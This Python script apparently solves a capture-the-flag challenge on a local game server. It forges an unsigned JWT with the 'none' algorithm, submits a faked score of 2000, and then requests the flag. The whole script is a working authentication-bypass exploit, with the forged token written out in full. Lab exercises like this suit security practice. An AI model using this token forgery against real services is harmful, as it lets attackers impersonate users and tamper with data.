import jwt
import requests
from random import choice

BASE_URL = 'http://localhost:8080'


def new_game(username):
    response = requests.post(f'{BASE_URL}/new', json={'username': username})
    if response.status_code == 200:
        token = response.cookies.get('session')
        return token
    else:
        print(f"Error creating new game: {response.text}")
        return None
def play(move):
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkZpenpCdXp6MTAxIiwiZ2FtZSI6Ijk5YjZhMWVhMzlhOTQzMDEiLCJpYXQiOjE3MjIxMjMyNjJ9.YcFvRY1VdLUPsXGzTV80zhzwJde8B1NNwF1LO0m73xg"

    token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyAidXNlcm5hbWUiOiAiRml6ekJ1enoxMDEiLCAiZ2FtZSI6ICI5OGI2YTFlYTM5YTk0MzAxIiwgImlhdCI6IDE3MjIxMjMyNjIgfQ."

    print("JWI: ", token)
    headers = {'Authorization': f'Bearer {token}'}  # Include the token in the header
    payload = {'position': move, 'score': 2000}

    response = requests.post(f'{BASE_URL}/play', json=payload, headers=headers)

    if response.status_code == 200:
        return response.json(), token
    else:
        print(f"Error playing game: {response.text}")
        return None



def get_scores():
    response = requests.get(f'{BASE_URL}/scores')
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Error retrieving scores: {response.text}")
        return None


def get_flag(token):
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.get(f'{BASE_URL}/flag', cookies={'session': token}, headers=headers)
    if response.status_code == 200:
        return response.text
    else:
        print(f"Error retrieving flag: {response.text}")
        return None


def main():
    resp, token = play('✂️')
    if resp:
        print(resp)

    scores = get_scores()
    if scores:
        print("Scores:", scores)

    flag = get_flag(token)
    if flag:
        print("Flag:", flag)


if __name__ == '__main__':
    main()
